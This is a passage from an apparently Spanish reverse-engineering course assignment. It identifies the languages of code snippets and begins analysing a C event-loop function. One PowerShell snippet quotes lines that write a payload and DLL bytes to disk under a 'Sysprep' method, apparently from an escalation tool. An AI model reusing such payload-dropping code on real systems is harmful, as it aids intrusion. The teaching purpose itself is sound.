

![Portada](capturas/portada-tarea1-modulo3.png)

# √çndice 
- [√çndice](#√≠ndice)
- [Ejercicio 1 - Identificaci√≥n del lenguaje](#ejercicio-1---identificaci√≥n-del-lenguaje)
  - [Trozo 1](#trozo-1)
    - [Definici√≥n de funci√≥n](#definici√≥n-de-funci√≥n)
    - [Declaraciones con :=](#declaraciones-con-)
    - [Uso de make para mapas](#uso-de-make-para-mapas)
    - [Conversi√≥n de tipos al estilo Go](#conversi√≥n-de-tipos-al-estilo-go)
    - [Uso de nil como valor nulo](#uso-de-nil-como-valor-nulo)
    - [Conclusi√≥n](#conclusi√≥n)
  - [Trozo 2](#trozo-2)
    - [La cabecera de la clase](#la-cabecera-de-la-clase)
    - [Anotaciones de tipos exclusivos de Typescript](#anotaciones-de-tipos-exclusivos-de-typescript)
    - [Uso de Javascript](#uso-de-javascript)
    - [Conclusi√≥n](#conclusi√≥n-1)
  - [Trozo 3](#trozo-3)
    - [Directiva al principio](#directiva-al-principio)
    - [Definici√≥n de procedimientos](#definici√≥n-de-procedimientos)
    - [Llamada a m√©todos de la aplicaci√≥n host](#llamada-a-m√©todos-de-la-aplicaci√≥n-host)
    - [Cuadros de mensaje y constantes vb](#cuadros-de-mensaje-y-constantes-vb)
    - [Firma de procedimiento con Optional, ByVal, As Tipo](#firma-de-procedimiento-con-optional-byval-as-tipo)
    - [Conclusi√≥n](#conclusi√≥n-2)
  - [Trozo 4](#trozo-4)
    - [La definici√≥n de la funci√≥n](#la-definici√≥n-de-la-funci√≥n)
    - [Declaraciones de variables locales](#declaraciones-de-variables-locales)
    - [Estructura del bucle y llamada a funci√≥n](#estructura-del-bucle-y-llamada-a-funci√≥n)
    - [Conclusi√≥n](#conclusi√≥n-3)
  - [Trozo 5](#trozo-5)
    - [Cmdlets con guiones y par√°metros con el s√≠mbolo -](#cmdlets-con-guiones-y-par√°metros-con-el-s√≠mbolo--)
    - [Variables con el s√≠mbolo $ delante](#variables-con-el-s√≠mbolo--delante)
    - [Uso de switch con strings entre comillas](#uso-de-switch-con-strings-entre-comillas)
    - [Operador match para expresiones regulares](#operador-match-para-expresiones-regulares)
    - [Tipos .NET entre corchetes y llamadas est√°ticas](#tipos-net-entre-corchetes-y-llamadas-est√°ticas)
    - [Conclusi√≥n](#conclusi√≥n-4)
- [Ejercicio 2 - An√°lisis de Funciones](#ejercicio-2---an√°lisis-de-funciones)
  - [Funci√≥n 1](#funci√≥n-1)
    - [1. Identificaci√≥n y prop√≥sito](#1-identificaci√≥n-y-prop√≥sito)
    - [2. Naturaleza de la funci√≥n](#2-naturaleza-de-la-funci√≥n)
    - [3. Signatura y par√°metros](#3-signatura-y-par√°metros)
    - [4. Valor de retorno](#4-valor-de-retorno)
    - [5. Comportamiento y Efectos secundarios](#5-comportamiento-y-efectos-secundarios)
    - [6. Pureza y Estado](#6-pureza-y-estado)
    - [7. Sistema de tipos y visibilidad](#7-sistema-de-tipos-y-visibilidad)
    - [8. Relaciones con otras funciones y librer√≠as](#8-relaciones-con-otras-funciones-y-librer√≠as)
    - [9 Ejecuci√≥n y depuraci√≥n](#9-ejecuci√≥n-y-depuraci√≥n)
    - [10. Estructuras de control](#10-estructuras-de-control)
    - [11. An√°lisis de malware / seguridad](#11-an√°lisis-de-malware--seguridad)
  - [Funci√≥n 2](#funci√≥n-2)
    - [1. Identificaci√≥n y prop√≥sito](#1-identificaci√≥n-y-prop√≥sito-1)
    - [2. Naturaleza de la funci√≥n](#2-naturaleza-de-la-funci√≥n-1)
    - [3. Signatura y par√°metros](#3-signatura-y-par√°metros-1)
    - [4. Valor de retorno](#4-valor-de-retorno-1)
    - [5. Comportamiento y Efectos secundarios](#5-comportamiento-y-efectos-secundarios-1)
    - [6. Pureza y Estado](#6-pureza-y-estado-1)
    - [7. Sistema de tipos y Visibilidad](#7-sistema-de-tipos-y-visibilidad-1)
    - [8. Relaciones con otras funciones y librer√≠as](#8-relaciones-con-otras-funciones-y-librer√≠as-1)
    - [9. Ejecuci√≥n y depuraci√≥n](#9-ejecuci√≥n-y-depuraci√≥n-1)
    - [10. Estructuras de control](#10-estructuras-de-control-1)
    - [11. An√°lisis de malware / seguridad](#11-an√°lisis-de-malware--seguridad-1)
  - [Funci√≥n 3](#funci√≥n-3)
    - [1. Identificaci√≥n y prop√≥sito](#1-identificaci√≥n-y-prop√≥sito-2)
    - [2. Naturaleza de la funci√≥n](#2-naturaleza-de-la-funci√≥n-2)
    - [3. Signatura y par√°metros](#3-signatura-y-par√°metros-2)
    - [4. Valor de retorno](#4-valor-de-retorno-2)
    - [5. Comportamiento y Efectos secundarios](#5-comportamiento-y-efectos-secundarios-2)
    - [6. Pureza y Estado](#6-pureza-y-estado-2)
    - [7. Sistema de tipos y visibilidad](#7-sistema-de-tipos-y-visibilidad-2)
    - [8. Relaciones con otras funciones y librer√≠as](#8-relaciones-con-otras-funciones-y-librer√≠as-2)
    - [9. Ejecuci√≥n y depuraci√≥n](#9-ejecuci√≥n-y-depuraci√≥n-2)
    - [10. Estructuras de control](#10-estructuras-de-control-2)
    - [11. An√°lisis de malware / seguridad](#11-an√°lisis-de-malware--seguridad-2)
  - [Funci√≥n 4](#funci√≥n-4)
    - [1. Identificaci√≥n y prop√≥sito](#1-identificaci√≥n-y-prop√≥sito-3)
    - [2. Naturaleza de la funci√≥n](#2-naturaleza-de-la-funci√≥n-3)
    - [3. Signatura y par√°metros](#3-signatura-y-par√°metros-3)
    - [4. Valor de retorno](#4-valor-de-retorno-3)
    - [5. Comportamiento y Efectos secundarios](#5-comportamiento-y-efectos-secundarios-3)
    - [6. Pureza y Estado](#6-pureza-y-estado-3)
    - [7. Sistema de tipos y Visibilidad](#7-sistema-de-tipos-y-visibilidad-3)
    - [8. Relaciones con otras funciones y librer√≠as](#8-relaciones-con-otras-funciones-y-librer√≠as-3)
    - [9. Ejecuci√≥n y depuraci√≥n](#9-ejecuci√≥n-y-depuraci√≥n-3)
    - [10. Estructuras de control](#10-estructuras-de-control-3)
    - [11. An√°lisis de malware / seguridad](#11-an√°lisis-de-malware--seguridad-3)
  - [Funci√≥n 5](#funci√≥n-5)
    - [1. Identificaci√≥n y Prop√≥sito](#1-identificaci√≥n-y-prop√≥sito-4)
    - [2. Naturaleza de la funci√≥n](#2-naturaleza-de-la-funci√≥n-4)
    - [3. Signatura y par√°metros](#3-signatura-y-par√°metros-4)
    - [4. Valor de retorno](#4-valor-de-retorno-4)
    - [5. Comportamiento y Efectos (Side Effects)](#5-comportamiento-y-efectos-side-effects)
    - [6. Pureza y Estado](#6-pureza-y-estado-4)
    - [7. Sistema de Tipos y Visibilidad](#7-sistema-de-tipos-y-visibilidad-4)
    - [8. Relaciones con otras funciones y librer√≠as](#8-relaciones-con-otras-funciones-y-librer√≠as-4)
    - [9. Ejecuci√≥n y depuraci√≥n](#9-ejecuci√≥n-y-depuraci√≥n-4)
    - [10. Estructuras de control](#10-estructuras-de-control-4)
    - [11. An√°lisis de malware / seguridad](#11-an√°lisis-de-malware--seguridad-4)
- [Ejercicio 3 - An√°lisis de variables](#ejercicio-3---an√°lisis-de-variables)
  - [1. Par√°metros y retorno](#1-par√°metros-y-retorno)
  - [2. Variables locales que crea y necesita; √°mbito de esas variables.](#2-variables-locales-que-crea-y-necesita-√°mbito-de-esas-variables)
  - [3. Uso y modificaci√≥n de par√°metros](#3-uso-y-modificaci√≥n-de-par√°metros)
  - [4. Lectura - Escritura de valores globales](#4-lectura---escritura-de-valores-globales)
  - [5. Estructuras de control](#5-estructuras-de-control)
  - [6. Llamadas a funciones externas](#6-llamadas-a-funciones-externas)
  - [7. Puntos de salida de la funci√≥n](#7-puntos-de-salida-de-la-funci√≥n)
  - [8. En resumen](#8-en-resumen)
- [Ejercicio 4 - Bases de datos simb√≥licas](#ejercicio-4---bases-de-datos-simb√≥licas)
  - [1. Pasos para crear una base de datos simb√≥lica en las herramientas elegidas](#1-pasos-para-crear-una-base-de-datos-simb√≥lica-en-las-herramientas-elegidas)
    - [ctags](#ctags)
    - [global](#global)
    - [cscope](#cscope)
  - [2. Busqueda de todas las funciones ‚Äúmain‚Äù que existen](#2-busqueda-de-todas-las-funciones-main-que-existen)
    - [Global](#global-1)
    - [Cscope](#cscope-1)
  - [3. B√∫squeda de las funciones que llaman a la funci√≥n stringmatch](#3-b√∫squeda-de-las-funciones-que-llaman-a-la-funci√≥n-stringmatch)
    - [Global](#global-2)
    - [Scope](#scope)
  - [4. B√∫squeda de la declaraci√≥n de struct stream](#4-b√∫squeda-de-la-declaraci√≥n-de-struct-stream)
    - [La declaraci√≥n de struct stream en el c√≥digo](#la-declaraci√≥n-de-struct-stream-en-el-c√≥digo)
    - [Global](#global-3)
    - [Cscope](#cscope-2)
  - [5. Enumeraci√≥n de las funciones que llaman la funci√≥n genRedisInfoString](#5-enumeraci√≥n-de-las-funciones-que-llaman-la-funci√≥n-genredisinfostring)
    - [Cscope en Modo NO interactivo](#cscope-en-modo-no-interactivo)
    - [Cscope en Modo interactivo](#cscope-en-modo-interactivo)
- [Ejercicio 5 - An√°lisis de las variables de un programa](#ejercicio-5---an√°lisis-de-las-variables-de-un-programa)
  - [Previo: Instalaci√≥n de gdbgui](#previo-instalaci√≥n-de-gdbgui)
  - [An√°lisis de las variables del programa](#an√°lisis-de-las-variables-del-programa)
    - [1. `gni` (Global No Inicializada)](#1-gni-global-no-inicializada)
    - [2. `gi` (Global Inicializada)](#2-gi-global-inicializada)
    - [3. `eni` (Est√°tica No Inicializada)](#3-eni-est√°tica-no-inicializada)
    - [4. `ei` (Est√°tica Inicializada)](#4-ei-est√°tica-inicializada)
    - [5. `pae` (El puntero en s√≠) y `*pae` (El contenido apuntado / Memoria Din√°mica)](#5-pae-el-puntero-en-s√≠-y-pae-el-contenido-apuntado--memoria-din√°mica)
  - [Tabla resumen de las variables](#tabla-resumen-de-las-variables)
    - [Esquema general de memoria para esas variables](#esquema-general-de-memoria-para-esas-variables)
- [Ejercicio 6 - Desofuscaci√≥n de un programa](#ejercicio-6---desofuscaci√≥n-de-un-programa)
  - [Desofuscaci√≥n del archivo](#desofuscaci√≥n-del-archivo)
    - [Buscamos finalizaciones de l√≠nea](#buscamos-finalizaciones-de-l√≠nea)
    - [B√∫squeda de cadenas con `\uXXXX`:](#b√∫squeda-de-cadenas-con-uxxxx)
    - [Eliminamos {...} seguido de un punto .](#eliminamos--seguido-de-un-punto-)
    - [Quitar los s√≠mbolos +](#quitar-los-s√≠mbolos-)
    - [Unir las cadenas](#unir-las-cadenas)
    - [Convertir todos los u00xx a caracteres](#convertir-todos-los-u00xx-a-caracteres)
      - [A√±adir espacios donde falten en var...](#a√±adir-espacios-donde-falten-en-var)
      - [Renombrar variables para entender la l√≥gica](#renombrar-variables-para-entender-la-l√≥gica)
    - [Limpiar llamadas a los objetos](#limpiar-llamadas-a-los-objetos)
    - [A√±adimos identaci√≥n y espacios en blanco](#a√±adimos-identaci√≥n-y-espacios-en-blanco)
  - [Analisis del comportamiento del malware](#analisis-del-comportamiento-del-malware)
    - [Persistencia - Auto-instalaci√≥n](#persistencia---auto-instalaci√≥n)
    - [Huella Digital  - Fingerprinting](#huella-digital----fingerprinting)
    - [Evasi√≥n de Antivirus - Anti-Sandbox](#evasi√≥n-de-antivirus---anti-sandbox)
    - [Conexi√≥n con el Servidor de Mando y Control - C2](#conexi√≥n-con-el-servidor-de-mando-y-control---c2)
    - [Descarga y Validaci√≥n del Malware](#descarga-y-validaci√≥n-del-malware)
    - [Ejecuci√≥n y Limpieza](#ejecuci√≥n-y-limpieza)
    - [Si falla o no se ejecuta nada](#si-falla-o-no-se-ejecuta-nada)
  - [Extracci√≥n los IOCs](#extracci√≥n-los-iocs)
    - [Indicadores de Red - Network Indicators](#indicadores-de-red---network-indicators)
    - [Indicadores de Host - Host-based Indicators](#indicadores-de-host---host-based-indicators)
    - [IoC de contenido - cadenas - strings](#ioc-de-contenido---cadenas---strings)
    - [Mapeo de las t√©cnicas observadas en el c√≥digo sobre la matriz MITRE ATT\&CK Enterprise](#mapeo-de-las-t√©cnicas-observadas-en-el-c√≥digo-sobre-la-matriz-mitre-attck-enterprise)
      - [T√°ctica: Execution - TA0002](#t√°ctica-execution---ta0002)
      - [T√°ctica: Persistence - TA0003](#t√°ctica-persistence---ta0003)
      - [T√°ctica: Defense Evasion - TA0005](#t√°ctica-defense-evasion---ta0005)
      - [T√°ctica: Command and Control - TA0011](#t√°ctica-command-and-control---ta0011)
      - [T√°ctica: Resource Development - TA0042 -  Command and Control](#t√°ctica-resource-development---ta0042----command-and-control)
      - [Tabla res√∫men de t√©cnicas observadas sobre la matriz MITRE ATT\&CK](#tabla-res√∫men-de-t√©cnicas-observadas-sobre-la-matriz-mitre-attck)
  - [Laboratorio para probar este malware](#laboratorio-para-probar-este-malware)
    - [Paso 1: Redirecci√≥n de DNS - El archivo Hosts](#paso-1-redirecci√≥n-de-dns---el-archivo-hosts)
    - [Paso 2: El Payload - Hello World](#paso-2-el-payload---hello-world)
    - [Paso 3: Certificado SSL Falso](#paso-3-certificado-ssl-falso)
    - [Paso 4: El Listener C2 en Python](#paso-4-el-listener-c2-en-python)
    - [C√≥mo ejecutar la prueba](#c√≥mo-ejecutar-la-prueba)
    - [Lo que deber√≠a pasar:](#lo-que-deber√≠a-pasar)


# Ejercicio 1 - Identificaci√≥n del lenguaje
Cuando nos dan un c√≥digo para que lo estudiemos, lo primero de todo es averiguar **en que lenguaje est√° escrito**. Ya sea **ensamblador o un lenguaje de alto nivel**, nuestro primer movimiento es observar los detalles del c√≥digo para responder las siguientes preguntas: **¬øEs un ensamblador o es c√≥digo de alto nivel? ¬øEl sistema de tipos es din√°mico o est√°tico? ¬øEs un lenguaje compilado o se trata de un lenguaje interpretado?** Para ello, vamos a entrenar la vista con trozos (la expresi√≥n anglosajona ser√≠a ‚Äúsnippet‚Äù) de c√≥digo sobre los que deb√©is averiguar en que lenguaje esta escrito e indicar como lo hab√©is averiguado. Es decir, no basta con decir: ‚ÄúEs Perl.‚Äù

## Trozo 1

![Trozo 1](capturas/trozo1.png)


### Definici√≥n de funci√≥n
```go
func InMemLoads() (map[string]Image, error) {
```
donde:
- Los tipos de retorno van despu√©s de los par√©ntesis, e incluso son m√∫ltiples `(map[string]Image, error)`. Esto es algo **muy t√≠pico de Go.**

---------------------------

### Declaraciones con :=
```go
ret := make(map[string]Image)
s, si, p := GetModuleLoadedOrder(0)
start := p
i := 1
```
donde:
- La declaraci√≥n corta `short variable declaration` con `:=` es una **caracter√≠stica distintiva de Go.**


---------------------------

### Uso de make para mapas
```
make(map[string]Image)
```
donde: 
- `make` es una **funci√≥n predefinida de Go (builtin)** que sirve espec√≠ficamente para inicializar mapas, canales y slices.

---------------------------

### Conversi√≥n de tipos al estilo Go
```
Image{uint64(s), uint64(si)}
```
donde:
- **En Go** las conversiones se escriben como llamadas de funci√≥n: `uint64(...)`.

---------------------------

### Uso de nil como valor nulo
```
return ret, nil
```
donde:
- **En Go**, `nil` representa el `valor cero` para ciertos tipos de referencia (punteros, interfaces, mapas, slices, canales y funciones) y significa `no hay valor / no apunta a nada`.


---------------------------

### Conclusi√≥n
**<mark>Este trozo est√° en Go (Golang)</mark>** porque los tipos de retorno van despu√©s de los par√©ntesis para definir funciones, devuelve `map[string]Image`, inicializa mapas con `make`, utiliza la asignaci√≥n corta `:=` y las conversiones de tipo expl√≠citas `uint64(...)`, elementos caracter√≠sticos de Go y no presentes juntos en otros lenguajes de alto nivel y compilado.
- Es un lenguaje de alto nivel.
- Usa un tipado est√°tico `(map[string]Image, error, uint64, etc.)`.
- Es compilado. El c√≥digo fuente de Go se traduce mediante el compilador go build directamente a c√≥digo m√°quina. 


---------------------------

## Trozo 2
![Trozo 1](capturas/trozo-2.png)


### La cabecera de la clase
```
export default class Encoder {
```
donde:
- `export default` es sintaxis de m√≥dulos `ES6 (JS/TS)`, que forma parte de JavaScript.
- `export default class Encoder` junto con anotaciones de tipo (`value: number`, `bytes: Uint8Array | Buffer | number[]`). Esa mezcla de m√≥dulos `ES6 + tipos est√°ticos` **apunta claramente a TypeScript.**

---------------------------

### Anotaciones de tipos exclusivos de Typescript
```
data: number[] = []
pushByte(value: number) {
pushInt(value: number, n: number, littleEndian=false) {
pushBytes(bytes: Uint8Array | Buffer | number[]) {
```
donde:
- El uso de tipos unidos con `| (Uint8Array | Buffer | number[])` y de tipos primitivos en los par√°metros (`n: number, littleEndian=false`) **es sintaxis t√≠pica de TypeScript para tipado est√°tico.‚Äã‚Äã**

---------------------------

### Uso de Javascript
```
let
const
b => this.data.push(b).
>>
&
```
donde:
- Usos de `let`, `const`.
- Arrow function: `b => this.data.push(b)`.
- Operadores bit a bit: `>>, & 0xff`.


---------------------------

### Conclusi√≥n
**<mark>Este trozo usa JavaScript moderno, y la combinaci√≥n ‚ÄúJS + anotaciones de tipo‚Äù es precisamente lo que demuestra el uso de TypeScript.</mark>**
- Es un lenguaje de alto nivel.
- Tiene tipado est√°tico (aunque se borra al compilar a JS).
- TypeScript se considera un lenguaje compilado, o m√°s precisamente `transpilado`.
  - El c√≥digo TypeScript no se ejecuta directamente en el navegador ni en Node; primero pasa por un compilador (tsc) que lo convierte a JavaScript est√°ndar.
  - El resultado de esa compilaci√≥n es JavaScript, y ese JavaScript s√≠ se ejecuta de forma interpretada (o JIT‚Äëcompilada) por el motor correspondiente.

---------------------------

## Trozo 3
![Trozo 1](capturas/trozo-3.png)

### Directiva al principio
```
Option Explicit
``` 
donde:
- **Es muy t√≠pica de VB/VBA** para obligar a declarar variables.

---------------------------

### Definici√≥n de procedimientos
```
Sub PDF2Workbook()
...
End Sub
``` 
donde:
- El uso de `Sub` ... `End Sub` para procedimientos es **propio de Visual Basic.**


----------------------------

### Llamada a m√©todos de la aplicaci√≥n host
```
Application.Run "PDFTables2Workbook", , True
``` 
donde:
- `Application.Run` es **t√≠pico en VBA dentro de Excel/Word.**

---------------------------

### Cuadros de mensaje y constantes vb
```
MsgBox PDFTablesPages, vbOKOnly + vbInformation, " PDFTables"
``` 
donde:
- `MsgBox` y constantes como `vbOKOnly`, `vbInformation`, `vbNullString` **son constantes predefinidas de VBA.**

---------------------------

### Firma de procedimiento con Optional, ByVal, As Tipo
```
ub PDFTables2Workbook(Optional ByVal InitialFolderFile As String = vbNullString, _
                       Optional ByVal AllowMultiSelect As Boolean = False)
``` 
donde:
- Esta **Sintaxis es caracter√≠stica de Visual Basic/VBA.**


---------------------------

###  Conclusi√≥n
**<mark>Es Visual Basic for Applications (VBA)**</mark> porque usa la directiva `Option Explicit`, define procedimientos con `Sub ... End Sub`, utiliza par√°metros `Optional ByVal ... As String/Boolean` y constantes predefinidas como `vbNullString y vbInformation`, todo ello t√≠pico de Visual Basic for Applications en macros de Office.
- Es un lenguaje de alto nivel.
- VBA usa un tipado est√°tico:
  - Si declaramos `Dim x As String o Dim y As Boolean`, el tipo de esa variable queda fijado y el compilador comprueba compatibilidad de tipos.
  - `Option Explicit` obliga a declarar las variables antes de usarlas.
- En el contexto de VBA (macros de Office) se compila a `p-code` y lo ejecuta el int√©rprete de VBA dentro de la aplicaci√≥n. A efectos pr√°cticos en esta clasificaci√≥n se suele considerar interpretado (no se produce un binario nativo independiente), pero realmente es **compilado a bytecode e interpretado por el runtime de Office**.



-----------------------------------

## Trozo 4
![Trozo 1](capturas/trozo-4.png)

### La definici√≥n de la funci√≥n
```
long uv__idna_toascii(const char* s, const char* se, char* d, char* de) {
``` 
donde:
- El Tipo de retorno al principio `(long)` y el uso de par√°metros con **tipos cl√°sicos de C** `(const char*)`.
- No hay clases, ni namespace, ni referencias (& en par√°metros), tampoco aparece referencias a orientaci√≥n a objetos ‚Üí **parece m√°s C que C++.**

----------------------------------------

### Declaraciones de variables locales
```
const char* si;
const char* st;
unsigned c;
char* ds;
int rc;
``` 
donde:
- Uso de punteros `(char*)` y del tipo `unsigned`, **muy t√≠pico en c√≥digo C.**

----------------------------------------

### Estructura del bucle y llamada a funci√≥n
```
while (si < se) {
    st = si;
    c = uv__utf8_decode1(&si, se);
    if (c == -1u)
        return UV_EINVAL;
}
``` 
donde:
- Sintaxis de control `(while, if)` **t√≠pica de la familia C.**
- Macros estilo `UV_EINVAL` **tambi√©n son muy de C** (constantes definidas con `#define`).


----------------------------------------

### Conclusi√≥n
**<mark>Es C porque declara funciones y variables con tipos primitivos**</mark> `(long, unsigned, int)` y punteros `(const char*)`, usa un `while` con comparaci√≥n de punteros, llama a funciones con paso de direcciones `(&si)` **<mark>y no aparece ninguna caracter√≠stica propia de C++ como referencias, new, class o namespace.**</mark>
- Es c√≥digo de alto nivel, lenguaje C.
- C tiene tipado est√°tico: todos los identificadores tienen tipo en tiempo de compilaci√≥n (`long`, `int`, `char*`, `unsigned`, ‚Ä¶).
- C es un lenguaje compilado: se traduce a c√≥digo m√°quina (normalmente a trav√©s de un compilador como gcc, clang, etc.).


----------------------------------------


## Trozo 5
![Trozo 1](capturas/trozo-5.png)

### Cmdlets con guiones y par√°metros con el s√≠mbolo -
```
Out-File -FilePath $PayloadPath -InputObject $Payload -Encoding ascii
```
donde:
- `Out-File`, `Get-WmiObject`, `Write-Output`, `Write-Verbose` son `cmdlets` **t√≠picos de PowerShell.**

---------------------------

### Variables con el s√≠mbolo $ delante
```
$PayloadPath
$OSVersion = (Get-WmiObject -Class win32_OperatingSystem).BuildNumber
```
donde:
- Las variables con prefijo `$` (`$OSVersion, $PayloadPath, $env:temp`) **son caracter√≠sticas de PowerShell.**

---------------------------

### Uso de switch con strings entre comillas
```
switch($method)
{
    "Sysprep"
    {
        ...
    }
}
```
donde:
- Sigue la **gram√°tica propia de PowerShell.**

---------------------------

### Operador match para expresiones regulares
```
if ($OSVersion -match "76")
```
donde:
- Sigue la **gram√°tica propia de PowerShell.**

---------------------------

### Tipos .NET entre corchetes y llamadas est√°ticas
```
[Byte[]] $temp = $DllBytes -split ' '
[System.IO.File]::WriteAllBytes($PathToDll, $temp)
```
donde:
- Muestran la **integraci√≥n directa de PowerShell con .NET**, algo distintivo frente a otros shells.

---------------------------

### Conclusi√≥n
**<mark>Concluimos que este trozo est√° escrito en PowerShell.**</mark>
- Es un lenguaje de alto nivel, script de PowerShell.
- PowerShell usa tipado din√°mico, aunque permite anotar tipos como `[Byte[]]`. Por defecto el sistema es din√°micamente tipado y resuelve tipos en tiempo de ejecuci√≥n, no en compilaci√≥n.
- Se considera un lenguaje interpretado / de scripting: el motor de PowerShell ejecuta el script directamente, sobre .NET.

---------------------------

# Ejercicio 2 - An√°lisis de Funciones

- Describe que hace la funci√≥n.
- Define si es funci√≥n o procedimiento.
- Define el tipo de la funci√≥n.
- ¬øEs o no es predicado?
- ¬øEs o no es una funci√≥n hoja?
- ¬øEs o no es una funci√≥n de sistema?
- ¬øEs o no es una funci√≥n con par√°metros variables?
- Describe la signatura de la funci√≥n.
  - Define los tipos de par√°metros que recibe.
  - Define si una par√°metros por defecto y qu√© valores poseen.
  - Define que tipo de dato devuelve.
  - Los par√°metros que usa la funci√≥n est√°n pasado por valor o por referencia?

- Define que devuelve la funci√≥n.
- Define si llama a otras funciones.
- Define si modifica alg√∫n par√°metro o solo lee los valores recibidos?.
- Define si devuelve un objeto creado dentro de ella.
- Define si modifica objetos globales.
- Define el Sistema de tipos usados, son din√°micos, son est√°ticos.
- Funciones que importa o exporta. ¬øC√≥mo el programa importa/exporta funciones de una librer√≠a? Mediante
  - Enlace din√°mico.
  - Enlace est√°tico.
  - Carga din√°mica, durante la ejecuci√≥n.
- ¬øEs una funci√≥n de usuario?
- ¬øes una funci√≥n que no cambia el estado del programa, es decir tiene transparencia referencial?
- ¬øEs una funci√≥n pura?
- ¬øcual es el √°mbito de la funci√≥n (su visibilidad)?
- Define las variables que usa, son globales? son locales? son est√°ticas?
- Si muta o lee valores fuera de su √°mbito. Es decir, valores no creados dentro de la funci√≥n o que no forman parte de los par√°metros de la funci√≥n.
- ¬øPosee o no par√°metros constantes?
- tiene runtime?
- tiene s√≠mbolos de depuraci√≥n?
- estamos en un modulo? una dll?
- Definir el √°mbito: estamos en un modulo? una funci√≥n?
- Explicar estructuras de bifurcaci√≥n, repetici√≥n, saltos...


## Funci√≥n 1
![funcion-1](capturas/funcion-1.png)
```
int aeResizeSetSize(aeEventLoop *eventLoop, int setsize) {
    int i;

    if (setsize == eventLoop->setsize) return AE_OK;
    if (eventLoop->maxfd >= setsize) return AE_ERR;
    if (aeApiResize(eventLoop,setsize) == -1) return AE_ERR;

    eventLoop->events = zrealloc(eventLoop->events,sizeof(aeFileEvent)*setsize);
    eventLoop->fired = zrealloc(eventLoop->fired,sizeof(aeFiredEvent)*setsize);
    eventLoop->setsize = setsize;

    /* Make sure that if we created new slots, they are initialized with
     * an AE_NONE mask. */
    for (i = eventLoop->maxfd+1; i < setsize; i++)
        eventLoop->events[i].mask = AE_NONE;
    return AE_OK;
}
```


### 1. Identificaci√≥n y prop√≥sito
- **Nombre:** aeResizeSetSize
- **Contexto:** funci√≥n C relacionada con un bucle de eventos (aeEventLoop).
- **Descripci√≥n:** La funci√≥n aeResizeSetSize se encarga de redimensionar la capacidad del bucle de eventos (eventLoop). Intenta expandir los arrays que almacenan los eventos registrados y los eventos disparados (events y fired) para acomodar un nuevo tama√±o (setsize). Si la redimensi√≥n es exitosa, inicializa las nuevas ranuras (slots) creadas con una m√°scara vac√≠a (AE_NONE).


### 2. Naturaleza de la funci√≥n
- **Clasificaci√≥n:** Es una funci√≥n porque devuelve un valor (`int`) usado t√≠picamente como c√≥digo de error/√©xito. 
  - Aunque retorna int, su valor principal reside en los efectos secundarios (modificar el eventLoop), no en el c√°lculo de un valor.
  - Tiene efectos secundarios significativos (modifica el estado del programa), por lo que **act√∫a sem√°nticamente como un procedimiento que devuelve un c√≥digo de error.**
- **Origen:** Funci√≥n de usuario, no forma parte de la biblioteca est√°ndar del lenguaje. No es una funci√≥n de sistema. Es c√≥digo definido por el programador (o la librer√≠a), no una llamada directa al kernel del sistema operativo.
- **¬øPredicado?** No estrictamente; devuelve un c√≥digo de error/√©xito, no un booleano puro. Un predicado suele devolver un booleano (verdadero/falso) evaluando una condici√≥n l√≥gica.
- **¬øFunci√≥n hoja?** No. Llama a otras funciones: aeApiResize y zrealloc. Por lo tanto, no es una hoja (leaf function) en el √°rbol de llamadas.


### 3. Signatura y par√°metros
- **Signatura:** `int aeResizeSetSize(aeEventLoop *eventLoop, int setsize)`
- **Aridad:** 2 par√°metros ‚Üí funci√≥n binaria.
- **Par√°metros:**
  - `eventLoop`:
    - Tipo: aeEventLoop *. Un puntero a una estructura aeEventLoop.
    - Paso: por valor, pero es un puntero ‚Üí permite modificar la estructura apuntada.
    - No est√° declarado const.
    - Mutabilidad: Se modifica intensivamente (punteros internos y metadatos).

  - `setsize`:
    - Tipo: int. Un entero que representa el nuevo tama√±o deseado.
    - Paso: por valor.
    - Tampoco est√° declarado const, aunque en la pr√°ctica no se modifica.

- **No hay palabra clave const en ninguno.** Ninguno de los par√°metros est√° marcado con el calificador const.
- **No tiene par√°metros por defecto.** El lenguaje C no soporta par√°metros por defecto. Ambos deben ser provistos al llamar la funci√≥n.
- **No es una funci√≥n con par√°metros variables.** Tiene un n√∫mero fijo de argumentos.



### 4. Valor de retorno
- **Tipo devuelto:** int. (Entero con signo).
- **¬øQu√© devuelve la funci√≥n?:** Devuelve constantes simb√≥licas (macros):
  - AE_OK ‚Üí Si la operaci√≥n fue exitosa.
  - AE_ERR ‚Üí Si hubo un error. Por:
    - setsize demasiado peque√±o (maxfd >= setsize), o
    - fallo de aeApiResize.
- **¬øDevuelve un objeto creado dentro de ella?:** No. Solo devuelve un c√≥digo de estado entero.


### 5. Comportamiento y Efectos secundarios
- **¬øLlama a otras funciones?:** S√≠.
  - aeApiResize(eventLoop, setsize)
  - zrealloc(...) (Una envoltura de realloc).
- **¬øModifica alg√∫n par√°metro o solo lee?:** Modifica el contenido apuntado por el par√°metro eventLoop. Espec√≠ficamente actualiza sus punteros internos (events, fired) y el campo setsize.
- **¬øModifica objetos globales?:** T√©cnicamente modifica memoria en el heap (mont√≠culo) a trav√©s de zrealloc. Si la estructura eventLoop a la que apunta el puntero es global, entonces s√≠ modifica un objeto global.
- **Muta o lee valores fuera de su √°mbito:** S√≠. Al acceder a eventLoop->events y eventLoop->fired, est√° mutando memoria que fue asignada fuera del √°mbito de esta funci√≥n espec√≠fica.



### 6. Pureza y Estado
- **¬øEs una funci√≥n pura?:** No.
  - Depende de estado externo (el contenido de eventLoop).
  - Tiene efectos secundarios (modifica eventLoop, realiza asignaci√≥n de memoria).
- **Transparencia referencial:** No tiene. No se puede reemplazar la llamada a la funci√≥n simplemente por su valor de retorno sin perder la l√≥gica de redimensionamiento del sistema.
- **¬øEs una funci√≥n que no cambia el estado del programa?:** No. Su prop√≥sito principal es cambiar el estado del programa (redimensionar estructuras de datos).


### 7. Sistema de tipos y visibilidad
- **Lenguaje:** C, tipado est√°tico. Los tipos se verifican en tiempo de compilaci√≥n.
- **Los tipos se conocen en compilaci√≥n:** int, aeEventLoop *, aeFileEvent, aeFiredEvent.
- **Enlace (Linkage):** Externo (P√∫blico).
  - No tiene static delante, as√≠ que por defecto tiene enlace externo (visible desde otros archivos si se declara en un header).

### 8. Relaciones con otras funciones y librer√≠as
- **Llama a:**
  - aeApiResize(eventLoop, setsize) ‚Üí parte dependiente del sistema/implementaci√≥n del backend de eventos.
  - zrealloc(...) ‚Üí wrapper de realloc (muy probablemente), funci√≥n de memoria.
- **No importa/exporta directamente librer√≠as** en el propio c√≥digo; eso ocurre a nivel de compilaci√≥n/enlace del m√≥dulo donde est√° definida.
